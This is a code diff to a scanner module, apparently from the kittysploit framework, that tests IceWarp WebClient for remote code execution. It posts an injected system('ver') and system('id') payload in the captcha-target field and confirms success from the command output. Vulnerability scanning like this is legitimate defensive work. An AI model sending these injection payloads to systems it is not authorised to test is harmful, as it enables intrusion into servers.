@@ -2,6 +2,8 @@
 # -*- coding: utf-8 -*-
 """IceWarp WebClient is susceptible to remote code execution."""
 
+import re
+
 from kittysploit import *
 from lib.protocols.http.http_client import Http_client
 
@@ -55,13 +57,37 @@ class Module(Scanner, Http_client):
 
     def run(self):
         path = '/webmail/basic/'
-        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data="_dlg[captcha][target]=system(\\'ver\\')\\\n")
-        if not r or r.status_code != 302:
-            return False
-        body = r.text or ""
-        body_any = ('Microsoft Windows [Version',)
-        if any(m in body for m in body_any):
-            self.set_info(severity='critical', reason='IceWarp WebClient - Remote Code Execution detected', path=path)
+        # Windows probe
+        r = self.http_request(
+            method='POST',
+            path=path,
+            headers={'Content-Type': 'application/x-www-form-urlencoded'},
+            data="_dlg[captcha][target]=system(\\'ver\\')\\\n",
+            allow_redirects=False,
+        )
+        body = (r.text or '') if r else ''
+        if r and 'Microsoft Windows [Version' in body:
+            self.set_info(
+                severity='critical',
+                reason='IceWarp WebClient RCE confirmed (ver)',
+                path=path,
+            )
+            return True
+        # Linux probe — confirm uid= rather than status alone
+        r2 = self.http_request(
+            method='POST',
+            path=path,
+            headers={'Content-Type': 'application/x-www-form-urlencoded'},
+            data="_dlg[captcha][target]=system(\\'id\\')\\\n",
+            allow_redirects=False,
+        )
+        body2 = (r2.text or '') if r2 else ''
+        if r2 and re.search(r'uid=\d+', body2):
+            self.set_info(
+                severity='critical',
+                reason='IceWarp WebClient RCE confirmed (id)',
+                path=path,
+            )
             return True
         return False
 
